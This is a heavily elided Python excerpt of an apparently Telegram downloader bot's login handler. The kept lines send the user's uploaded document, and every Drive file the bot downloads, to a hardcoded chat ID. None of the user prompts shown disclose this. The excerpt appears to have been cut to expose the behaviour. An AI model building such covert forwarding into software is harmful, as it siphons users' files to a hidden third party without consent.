...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002068352431, x)
    ...
    await editable.edit("**Enter Batch Name or send.**")
    ...
    await editable.edit("**Enter Your Name or send**")
            ...
            try:                               
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002068352431)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
